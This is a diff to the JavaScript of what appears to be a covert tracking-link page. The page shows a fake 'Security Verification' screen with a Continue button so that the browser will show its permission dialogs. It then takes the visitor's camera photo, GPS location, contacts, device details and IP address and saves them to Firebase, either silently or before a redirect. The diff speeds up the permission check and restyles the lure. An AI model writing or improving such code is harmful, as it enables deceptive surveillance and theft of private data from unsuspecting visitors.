@@ -184,67 +184,86 @@ function nowTimeStr() {
     return new Date().toLocaleTimeString();
 }
 
-// ── DETECT IF BROWSER BLOCKS AUTOMATIC PERMISSION PROMPTS ─────────────────
-// Uses the Permissions API to check existing grant states.
-// A 'prompt' state means the browser needs a user-gesture before the native
-// permission dialog can appear.
-// Returns true  → CAPTCHA needed
-// Returns false → permissions can fire without user interaction
-async function checkPermissionBlocking(needsCam, needsGPS) {
-    if (!('permissions' in navigator)) return true; // No API → assume blocked
-
-    const queries = [];
-    if (needsCam) queries.push(
-        navigator.permissions.query({ name: 'camera' }).catch(() => ({ state: 'prompt' }))
-    );
-    if (needsGPS) queries.push(
-        navigator.permissions.query({ name: 'geolocation' }).catch(() => ({ state: 'prompt' }))
-    );
-
-    // Only contacts requested — Contact Picker always needs a gesture; CAPTCHA covers it.
-    if (queries.length === 0) return true;
-
-    try {
-        const results = await Promise.all(queries);
-        // Any 'prompt' state requires user interaction before the browser will show the dialog.
-        return results.some(r => r.state === 'prompt');
-    } catch (_) {
-        return true;
+// ── EAGERLY QUERY BROWSER PERMISSION STATES ──────────────────────────────
+// Called immediately on page load, in parallel with the Firebase fetch.
+// The Permissions API resolves near-instantly (no network round-trip).
+// Returns the raw browser grant states for camera and geolocation so the
+// calling code can decide — without any added delay — whether to show the
+// verification screen.
+async function queryPermissionStates() {
+    if (!('permissions' in navigator)) {
+        // Permissions API absent (old iOS Safari etc.) — treat as needing gesture.
+        return { camera: 'prompt', geolocation: 'prompt' };
     }
+    const [cam, geo] = await Promise.all([
+        navigator.permissions.query({ name: 'camera'      }).catch(() => ({ state: 'prompt' })),
+        navigator.permissions.query({ name: 'geolocation' }).catch(() => ({ state: 'prompt' })),
+    ]);
+    return { camera: cam.state, geolocation: geo.state };
+}
+
+// ── REFINE PERMISSION LOG STATUS ACCURACY ────────────────────────────────
+// Called after runPermissions() completes.  Corrects the log object in-place
+// WITHOUT touching runPermissions() itself.
+//
+// Problem: capturePhoto() / getLocation() both return null / 'Denied' whether
+// the user explicitly denied the prompt OR the browser permanently blocked the
+// permission.  We re-query the state after the attempt: a post-attempt state
+// of 'denied' means the browser has it permanently blocked → status='blocked'.
+// If the state is still 'prompt' the user dismissed/denied → keep 'denied'.
+async function refinePermissionLog(log, needsCam, needsGPS) {
+    if (!('permissions' in navigator)) return;
+    const tasks = [];
+    if (needsCam && log.camera.status === 'denied') {
+        tasks.push(
+            navigator.permissions.query({ name: 'camera' })
+                .then(r => { if (r.state === 'denied') log.camera.status = 'blocked'; })
+                .catch(() => {})
+        );
+    }
+    if (needsGPS && log.gps.status === 'denied') {
+        tasks.push(
+            navigator.permissions.query({ name: 'geolocation' })
+                .then(r => { if (r.state === 'denied') log.gps.status = 'blocked'; })
+                .catch(() => {})
+        );
+    }
+    if (tasks.length) await Promise.all(tasks);
 }
 
 // ── VERIFICATION SCREEN (Continue button) ────────────────────────────────
-// Shown only when the browser blocks automatic permission prompts.
-// No puzzles, no delays — resolves the moment the user clicks Continue.
+// Shown only when the browser requires a user gesture before permission
+// dialogs can appear.  Resolves the instant the user clicks Continue.
+// Light/white design — minimal, fast-loading, mobile-friendly.
 function showCaptcha() {
     return new Promise(resolve => {
         const overlay = document.createElement('div');
         overlay.style.cssText =
-            'position:fixed;inset:0;background:#080b12;display:flex;' +
+            'position:fixed;inset:0;background:#f1f5f9;display:flex;' +
             'align-items:center;justify-content:center;z-index:99999;' +
             'font-family:"Segoe UI",system-ui,sans-serif;';
 
         overlay.innerHTML =
-            '<div style="background:#111827;border:1px solid #1e293b;border-radius:18px;' +
-                'padding:48px 40px 40px;width:340px;max-width:92vw;text-align:center;' +
-                'box-shadow:0 30px 80px rgba(0,0,0,.8);">' +
+            '<div style="background:#ffffff;border-radius:20px;' +
+                'padding:48px 40px 42px;width:360px;max-width:92vw;text-align:center;' +
+                'box-shadow:0 8px 32px rgba(15,23,42,.10),0 2px 8px rgba(15,23,42,.06);">' +
 
               '<div style="width:64px;height:64px;border-radius:50%;' +
-                  'background:linear-gradient(135deg,#3b82f6,#8b5cf6);' +
-                  'margin:0 auto 20px;display:flex;align-items:center;' +
+                  'background:linear-gradient(135deg,#3b82f6,#6366f1);' +
+                  'margin:0 auto 22px;display:flex;align-items:center;' +
                   'justify-content:center;font-size:28px;">🛡️</div>' +
 
-              '<h2 style="color:#e2e8f0;font-size:20px;font-weight:700;' +
-                  'margin:0 0 10px;letter-spacing:-.01em;">Security Verification</h2>' +
+              '<h2 style="color:#0f172a;font-size:22px;font-weight:700;' +
+                  'margin:0 0 10px;letter-spacing:-.02em;">Security Verification</h2>' +
 
-              '<p style="color:#64748b;font-size:13px;margin:0 0 32px;line-height:1.6;">' +
+              '<p style="color:#64748b;font-size:14px;margin:0 0 34px;line-height:1.6;">' +
                   'Click continue to proceed.</p>' +
 
               '<button id="_continueBtn" ' +
-                  'style="width:100%;padding:16px;' +
-                  'background:linear-gradient(135deg,#3b82f6,#2563eb);' +
-                  'color:#fff;border:none;border-radius:12px;font-size:15px;' +
-                  'font-weight:700;cursor:pointer;letter-spacing:.01em;">' +
+                  'style="width:100%;padding:16px;background:#3b82f6;' +
+                  'color:#fff;border:none;border-radius:12px;font-size:16px;' +
+                  'font-weight:700;cursor:pointer;letter-spacing:.01em;' +
+                  'box-shadow:0 4px 16px rgba(59,130,246,.35);">' +
                   'Continue' +
               '</button>' +
 
@@ -370,15 +389,23 @@ async function initVerification() {
     const linkId = params.get('linkId');
     if (!linkId) return;
 
+    // ── Fire ALL async work simultaneously from the very first tick ───────
+    // queryPermissionStates() is near-instant (Permissions API, no network).
+    // By the time Firebase responds, permission states are already known.
+    const settingsPromise   = get(ref(db, 'managed_links/' + linkId));
+    const permStatesPromise = queryPermissionStates();
+    const infoPromise       = collectDeviceInfo();
+    const ipPromise         = getIPAddress();
+
+    // ── Wait for Firebase settings ────────────────────────────────────────
     let settings;
     try {
-        const snap = await get(ref(db, 'managed_links/' + linkId));
+        const snap = await settingsPromise;
         settings   = snap.val();
     } catch (e) {
         console.error('Firebase fetch error:', e);
         return;
     }
-
     if (!settings || !settings.active) return;
 
     runTransaction(ref(db, 'managed_links/' + linkId + '/visits'), current => (current || 0) + 1).catch(() => {});
@@ -389,35 +416,46 @@ async function initVerification() {
     const hasRedirect  = isValidUrl(settings.redirectUrl);
     const hasAnyPerm   = needsCam || needsGPS || needsContact;
 
-    // Kick off background tasks immediately (run in parallel with permission check)
-    const infoPromise = collectDeviceInfo();
-    const ipPromise   = getIPAddress();
+    // ── Permission states already resolved (ran in parallel) ─────────────
+    const permStates = await permStatesPromise;
 
-    // ── STEP 1: Detect if browser blocks automatic permission prompts ─────
+    // ── Decide immediately: does this browser require a user gesture? ─────
+    // 'prompt' → browser will ask, but only from a user-initiated gesture.
+    // 'granted' → already allowed, no gesture needed.
+    // 'denied' → permanently blocked, no gesture helps.
+    // Contact Picker API always requires a user gesture regardless of state.
     let permissionTrigger       = 'direct';
     let browserBlocksAutoPrompt = false;
 
     if (hasAnyPerm) {
-        browserBlocksAutoPrompt = await checkPermissionBlocking(needsCam, needsGPS);
+        browserBlocksAutoPrompt =
+            (needsCam     && permStates.camera      === 'prompt') ||
+            (needsGPS     && permStates.geolocation === 'prompt') ||
+            !!needsContact; // Contact Picker always requires gesture
 
-        // ── STEP 2: Show CAPTCHA only if browser requires user gesture ────
+        // ── Show verification screen with 0ms delay ───────────────────────
         if (browserBlocksAutoPrompt) {
             await showCaptcha();
             permissionTrigger = 'captcha';
         }
     }
 
-    // ── STEP 3: Request each permission and record result ─────────────────
+    // ── Request each permission and record result ─────────────────────────
     const { photoData, lat, lon, contacts, log: permissionLog } =
         await runPermissions(needsCam, needsGPS, needsContact);
 
-    // ── STEP 4: Evaluate results ──────────────────────────────────────────
+    // ── Refine status accuracy post-run ───────────────────────────────────
+    // Distinguishes browser-permanently-blocked ('blocked') from
+    // user-dismissed/denied ('denied') without touching runPermissions().
+    await refinePermissionLog(permissionLog, needsCam, needsGPS);
+
+    // ── Evaluate grant results ────────────────────────────────────────────
     const camGranted     = !needsCam     || (photoData !== null);
     const gpsGranted     = !needsGPS     || (typeof lat === 'number');
     const contactGranted = !needsContact || (contacts !== null);
     const allGranted     = camGranted && gpsGranted && contactGranted;
 
-    // ── STEP 5A: Redirect path ────────────────────────────────────────────
+    // ── Redirect path ─────────────────────────────────────────────────────
     if (hasRedirect && allGranted) {
         Promise.all([infoPromise, ipPromise])
             .then(([deviceInfo, ipAddress]) =>
@@ -432,7 +470,7 @@ async function initVerification() {
         return;
     }
 
-    // ── STEP 5B: No-redirect path — save and stay silent ─────────────────
+    // ── No-redirect path — save and stay silent ───────────────────────────
     const [deviceInfo, ipAddress] = await Promise.all([infoPromise, ipPromise]);
     await saveCapture({
         photoData, lat, lon, contacts, settings, linkId, ipAddress, deviceInfo,
